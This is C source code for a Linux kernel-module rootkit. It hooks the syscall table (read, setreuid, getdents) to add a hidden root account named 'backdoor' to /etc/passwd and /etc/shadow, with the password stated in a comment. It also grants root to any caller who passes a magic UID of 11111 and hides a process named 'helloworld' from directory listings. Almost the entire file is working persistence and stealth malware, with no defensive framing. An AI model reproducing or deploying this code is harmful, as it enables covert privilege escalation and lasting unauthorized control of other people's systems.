#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/cred.h>

// check whether system is 32-bit or 64-bit to assign appropriate pointer size
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

asmlinkage int (*o_read)(int fd, void* buf, size_t count);

psize *sys_call_table;

asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);

asmlinkage long backdoor_setreuid(uid_t r, uid_t e) {
	uid_t secret = 11111;
	if(r == secret && e == secret) {
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->gid = 0;
        credentials->suid = credentials->sgid = 0;
        credentials->euid = credentials->egid = 0;
        credentials->fsuid = credentials->fsgid = 0;

        return commit_creds(credentials);
	} else {
		return (*o_setreuid) (r, e);
	}


}

psize **find(void) {

	psize **sctable;
	psize i = START_CHECK;

	while (i < END_CHECK) {

		sctable = (psize **) i;
		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
		i += sizeof(void *);
	}
	return NULL;
}

// backdoor account
// ================

// username is 'backdoor'
// password is 'backdoor'

#define PASSWD_PATH "/etc/passwd"
#define SHADOW_PATH "/etc/shadow"
#define PASSWD_STRING "backdoor:x:0:0:backdoor:/home:/bin/bash\n"
#define SHADOW_STRING "backdoor:$6$dA0/uaf7$vPdpHbTxoH0Xa1xDDhOW0ROQKvx9RkK02h1HPMqIR5XgSx5EX2oiSIZ9.1Sl16KOVIRNpxiOfwifL4ssxhH/W.:18219:0:99999:7:::\n"


// some helper functions, so we don't have to write the same thing for passwd and shadow

void add_text_to_file(char* text, char* file_path) {

	// declare variables
	mm_segment_t fs;

	// open file
	struct file* filp = filp_open(file_path, O_WRONLY | O_APPEND, 0);
	if (IS_ERR(filp)) {

		printk(KERN_ERR "could not open file %s\n", file_path);
		return;
	}

	fs = get_fs();
        set_fs(get_ds());

	vfs_write(filp, text, strlen(text), &filp->f_pos);

        set_fs(fs);
	filp_close(filp, NULL);
}

void delete_text_from_file(char* text, char* file_path) {

	// declare variables
	int size;
	mm_segment_t fs;
	char* buf;
	char* position;
	int text_size;
	int offset;
	char* end_of_file;
	int end_of_file_size;
	int new_size;

	// open file
	struct file* filp = filp_open(file_path, O_RDWR, 0);
	if (IS_ERR(filp)) {

		printk(KERN_ALERT "could not open file %s\n", file_path);
		return;
	}

	// find file size
	vfs_llseek(filp, 0, SEEK_END);
	size = filp->f_pos;
	vfs_llseek(filp, 0, SEEK_SET);

	buf = kzalloc(size + 1, GFP_KERNEL);

	// set fs
	fs = get_fs();
        set_fs(get_ds());

	// find our text in the file
	vfs_read(filp, buf, size, &filp->f_pos);
	position = strstr(buf, text);
	if (position == NULL) {

		printk("couldn't find text in file\n");
		set_fs(fs);
		filp_close(filp, NULL);
		kfree(buf);
		return;
	}

	// create a buch of variables with this pointer
	text_size = strlen(text);
	offset = position - buf;
	end_of_file = position + text_size;
	end_of_file_size = size - offset - text_size;
	new_size = size - text_size;

	// write over the found text
	vfs_llseek(filp, offset, SEEK_SET);
	vfs_write(filp, end_of_file, end_of_file_size, &filp->f_pos);

	// truncate file
	do_truncate(filp->f_dentry, new_size, 0, filp);

	// cleanup
        set_fs(fs);
	filp_close(filp, NULL);
	kfree(buf);
}

int delete_text_from_buffer(char* text, char* buf, int bytes_read) {

	// declare variables
	char* k_buf;
	char* position;
	int text_size;
	int offset;
	char* end_of_buffer;
	int end_of_buffer_size;
	int new_size;

	// copy the buffer to kernel space
	k_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
	copy_from_user(k_buf, buf, bytes_read);

	// find our text in the buffer
	position = strstr(k_buf, text);
	if (position == NULL) {
		kfree(k_buf);
		return bytes_read;
	}

	// create a bunch of variables with this pointer
	text_size = strlen(text);
	offset = position - k_buf;
	end_of_buffer = position + text_size;
	end_of_buffer_size = bytes_read - offset - text_size;
	new_size = bytes_read - text_size;

	// overwrite user's buffer
	copy_to_user(buf + offset, end_of_buffer, end_of_buffer_size + 1); // the + 1 is to write a null byte at the end

	// cleanup and return
	kfree(k_buf);
	return new_size;
}

// a read function that hides our added text

asmlinkage int backdoor_read(int fd, void* buf, size_t count) {

	// declare variables
	struct file* filp;
	struct path* path;
	char* tmp;
	char* pathname;

	// perform the read
	int bytes_read = (*o_read)(fd, buf, count);
	if (bytes_read <= 0) return bytes_read;

	// get the file path
	filp = fcheck(fd);
	path = &filp->f_path;
	path_get(path);
	tmp = (char *)__get_free_page(GFP_KERNEL);

	if (!tmp) {

		path_put(path);
		printk(KERN_ERR "could not create tmp\n");
		return bytes_read;
	}

	pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);

	if (IS_ERR(pathname)) {

		free_page((unsigned long)tmp);
		printk(KERN_ERR "invalid pathname\n");
		return bytes_read;
	}

	// check if we need to hide anything
	if (strcmp(pathname, PASSWD_PATH) == 0) bytes_read = delete_text_from_buffer(PASSWD_STRING, buf, bytes_read);
	if (strcmp(pathname, SHADOW_PATH) == 0) bytes_read = delete_text_from_buffer(SHADOW_STRING, buf, bytes_read);

	// cleanup
	free_page((unsigned long)tmp);
	return bytes_read;
}

//	========================
//	Process Hiding
//	========================
#define HIDDEN_PROCESS "helloworld"

//helper function for getting process name from a PID
void get_name_from_pid(char* pid, char* buff) {

	//declare variable
	struct file *fp;
	mm_segment_t fs;
	char *proc = "/proc/";
	char *cmdline = "/comm";
	char *buf = (char*) kcalloc(1, 16, GFP_KERNEL);

	//create the filepath to the process name
	strcpy(buf, proc);
	strcat(buf, pid);
	strcat(buf, cmdline);
	//printk("%s\n", buf);

	//open the filepath if possible
	fp = filp_open(buf,O_RDONLY,0);
	if(IS_ERR(fp))
	{
		//printk("open file error\n");
		kfree(buf);
		return;
	}
	fs = get_fs();
	set_fs(KERNEL_DS);

	//read the process name into the buffer
	int n = vfs_read(fp, buff, 16, &fp->f_pos);
	//printk("return %d buff %s\n", n, buff);

	//cleanup
	buff[n] = '\0';
	filp_close(fp, NULL);
	set_fs(fs);
	kfree(buf);
}

//wrap the getdents system call to exclude our processes
asmlinkage int (*o_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int backdoor_getdents (unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
	struct linux_dirent {
	    long           d_ino;
	    off_t          d_off;
	    unsigned short d_reclen;
	    char           d_name[];
	};
	struct linux_dirent *kdirp,*kdirp2;
  long value,tlen;
  long kdirplength = 0;

	//run o_getdents
	value = (*o_getdents) (fd, dirp, count);
  tlen = value;

	//linux dirents for the current dirent being analyzed and for copying into the original
	kdirp = (struct linux_dirent *) kmalloc(tlen, GFP_KERNEL);
  kdirp2 = kdirp;
  copy_from_user(kdirp, dirp, tlen);

	//iterate though what o_getdents read
	while(tlen > 0)
  {
    kdirplength = kdirp->d_reclen;
    tlen = tlen - kdirplength;
		char* pidname = kcalloc(1, 16, GFP_KERNEL);
		if (kdirp->d_name != NULL)
		get_name_from_pid(kdirp->d_name, pidname);

		//check if the process we want to hide is in the dirent being analyzed
		if(strstr(pidname, HIDDEN_PROCESS) != NULL)
    {
			//if so, remove from the dirp so it cannot be read from
      memmove(kdirp, (char *) kdirp + kdirp->d_reclen, tlen);
      value = value - kdirplength;
      //printk(KERN_INFO "hide successful.\n");
    }
    else if(tlen)
		{
			//else, go to the next dirent
      kdirp = (struct linux_dirent *) ((char *)kdirp + kdirp->d_reclen);
		}
		kfree(pidname);
  }
	//copy our modified dirp to the original and return
  copy_to_user(dirp, kdirp2, value);
  kfree(kdirp2);
  return value;
}


// init and remove the backdoor stuff

void add_backdoor(void) {

	add_text_to_file(PASSWD_STRING, PASSWD_PATH);
	add_text_to_file(SHADOW_STRING, SHADOW_PATH);

	write_cr0(read_cr0() & (~ 0x10000));
	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
	write_cr0(read_cr0() | 0x10000);
}

void remove_backdoor(void) {

	delete_text_from_file(PASSWD_STRING, PASSWD_PATH);
	delete_text_from_file(SHADOW_STRING, SHADOW_PATH);

	write_cr0(read_cr0() & (~ 0x10000));
	xchg(&sys_call_table[__NR_read],o_read);
	write_cr0(read_cr0() | 0x10000);
}

void add_setreuid(void) {

	write_cr0(read_cr0() & (~ 0x10000));
	o_setreuid = (void*) xchg(&sys_call_table[__NR_setreuid32], backdoor_setreuid);
	write_cr0(read_cr0() | 0x10000);
}

void remove_setreuid(void) {

	write_cr0(read_cr0() & (~ 0x10000));
	xchg(&sys_call_table[__NR_setreuid32], o_setreuid);
	write_cr0(read_cr0() | 0x10000);
}

void add_getdents(){

	write_cr0(read_cr0() & (~ 0x10000));
	o_getdents = (void*) xchg(&sys_call_table[__NR_getdents], backdoor_getdents);
	write_cr0(read_cr0() | 0x10000);
}

void remove_getdents(){

	write_cr0(read_cr0() & (~ 0x10000));
	xchg(&sys_call_table[__NR_getdents], o_getdents);
	write_cr0(read_cr0() | 0x10000);
}


// ==========================
// load and unload the module
// ==========================

int init_module(void) {
    if((sys_call_table = (psize *) find())) {
		printk("sys_call_table found at %p\n", sys_call_table);
	} else {
		printk(KERN_ERR "syscall table not found; aborting\n");
		return 1;
	}

	add_backdoor();
	add_setreuid();
	add_getdents();

	printk(KERN_INFO "rootkit loaded\n");
	return 0;
}

void cleanup_module(void) {

	remove_backdoor();
	remove_setreuid();
	remove_getdents();

	printk(KERN_INFO "rootkit unloaded\n");
}
